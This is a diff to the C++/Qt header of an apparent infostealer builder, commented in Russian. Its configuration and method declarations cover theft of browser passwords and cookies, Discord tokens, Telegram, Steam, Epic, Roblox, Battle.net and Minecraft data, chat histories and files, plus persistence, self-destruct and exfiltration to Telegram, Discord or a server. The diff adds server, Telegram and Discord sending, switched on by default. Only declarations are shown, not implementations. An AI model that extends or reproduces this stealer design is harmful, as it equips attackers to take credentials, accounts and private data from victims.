@@ -81,8 +81,8 @@ public:
         bool passwords = false;            // Включение кражи паролей браузеров
         bool screenshot = false;           // Включение создания скриншота
         bool fileGrabber = false;          // Включение граббера файлов
-        bool stealFiles = false;           // Включение кражи файлов (ДОБАВЛЕНО)
-        std::vector<std::string> files;    // Добавлено поле для хранения путей к файлам
+        bool stealFiles = false;           // Включение кражи файлов
+        std::vector<std::string> files;    // Поле для хранения путей к файлам
         bool systemInfo = false;           // Включение сбора системной информации
         bool socialEngineering = false;    // Включение сбора данных для социальной инженерии
         bool chatHistory = false;          // Включение сбора истории чатов
@@ -94,6 +94,9 @@ public:
         bool persist = false;              // Включение персистентности
         bool selfDestruct = false;         // Включение самоуничтожения
         bool encryptData = false;          // Включение шифрования данных
+        bool sendToServer = true;          // Включение отправки на сервер (ДОБАВЛЕНО)
+        bool sendToTelegram = true;        // Включение отправки в Telegram (ДОБАВЛЕНО)
+        bool sendToDiscord = true;         // Включение отправки в Discord (ДОБАВЛЕНО)
         std::string sendMethod = "Local File";  // Метод отправки данных (Telegram, Discord, Local File)
         std::string buildMethod = "Local Build"; // Метод сборки (Local Build, GitHub Actions)
         std::string telegramToken = "";         // Токен для Telegram
@@ -108,6 +111,8 @@ public:
         std::string githubRepo = "";            // Репозиторий GitHub
         std::string uploadUrl = "http://example.com/upload"; // URL для отправки данных
         std::string serverUrl = "";             // URL сервера для отправки данных
+        std::string telegramBotToken = "";      // Токен бота Telegram (ДОБАВЛЕНО для совместимости)
+        std::string telegramChatId = "";        // Chat ID Telegram (ДОБАВЛЕНО для совместимости)
     } config;
 
     // UI элементы
@@ -159,6 +164,9 @@ public:
     std::string collectedData;             // Текстовые данные
     std::vector<std::string> filesToSend;  // Файлы для отправки
 
+    // Публичный метод StealAndSendData (перенесено из private в public)
+    void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных
+
 signals:
     void logUpdated(const QString& message); // Сигнал для обновления логов
     void startStealSignal();                // Сигнал для запуска процесса кражи данных
@@ -180,27 +188,27 @@ private slots:
 
     // Слоты для процесса кражи и отправки данных
     void startStealProcess();               // Запуск процесса кражи данных после успешной сборки
-    void StealAndSendData(const std::string& tempDir); // Основная функция кражи и отправки данных
-    void takeScreenshot(const std::string& dir); // Создание скриншота
-    void collectSystemInfo(const std::string& dir); // Сбор системной информации
-    void stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
-    void stealDiscordTokens();              // Кража токенов Discord (ДОБАВЛЕНО)
-    void stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
-    void stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
-    void stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
-    void stealEpicData(const std::string& dir);    // Кража данных Epic Games
-    void stealRobloxData(const std::string& dir);  // Кража данных Roblox
-    void stealBattleNetData(const std::string& dir); // Кража данных Battle.net
-    void stealMinecraftData(const std::string& dir); // Кража данных Minecraft
-    void stealChatHistory(const std::string& dir); // Кража истории чатов
-    void stealFiles(const std::string& dir);       // Кража файлов (граббер)
-    void collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
-    void archiveData(const std::string& dir, const std::string& archivePath); // Архивация данных
-    void encryptData(const std::string& inputPath, const std::string& outputPath); // Шифрование данных
-    void decryptData(const std::string& inputPath, const std::string& outputPath); // Дешифрование данных
-    void sendToTelegram(const std::string& filePath); // Отправка данных в Telegram
-    void sendToDiscord(const std::string& filePath);  // Отправка данных в Discord
-    void saveToLocalFile(const std::string& filePath); // Сохранение данных в локальный файл
+    std::string takeScreenshot(const std::string& dir); // Создание скриншота (изменено на std::string)
+    std::string collectSystemInfo(const std::string& dir); // Сбор системной информации (изменено на std::string)
+    std::string stealBrowserData(const std::string& dir); // Кража данных браузера (пароли, куки)
+    void stealDiscordTokens();              // Кража токенов Discord
+    std::string stealDiscordData(const std::string& dir); // Кража данных Discord (токены, история чатов)
+    std::string stealTelegramData(const std::string& dir); // Кража данных Telegram (история чатов)
+    std::string stealSteamData(const std::string& dir);   // Кража данных Steam (конфиги, MA-файлы)
+    std::string stealEpicData(const std::string& dir);    // Кража данных Epic Games
+    std::string stealRobloxData(const std::string& dir);  // Кража данных Roblox
+    std::string stealBattleNetData(const std::string& dir); // Кража данных Battle.net
+    std::string stealMinecraftData(const std::string& dir); // Кража данных Minecraft
+    std::string stealChatHistory(const std::string& dir); // Кража истории чатов
+    std::vector<std::string> stealFiles(const std::string& dir); // Кража файлов (граббер) (изменено на std::vector<std::string>)
+    std::string collectSocialEngineeringData(const std::string& dir); // Сбор данных для социальной инженерии
+    std::string archiveData(const std::string& dir, const std::vector<std::string>& files); // Архивация данных (изменено)
+    std::string encryptData(const std::string& data); // Шифрование данных (изменено)
+    std::string decryptData(const std::string& encryptedData); // Дешифрование данных (изменено)
+    void sendToTelegram(const std::string& data, const std::vector<std::string>& files); // Отправка данных в Telegram (изменено)
+    void sendToDiscord(const std::string& data, const std::vector<std::string>& files);  // Отправка данных в Discord (изменено)
+    void saveToLocalFile(const std::string& data, const std::string& dir); // Сохранение данных в локальный файл (изменено)
+    void sendDataToServer(const std::string& data, const std::vector<std::string>& files); // Отправка данных на сервер (ДОБАВЛЕНО)
 
     // Слоты для управления конфигурацией и логами
     void saveConfig(const QString& fileName = QString()); // Сохранение конфигурации
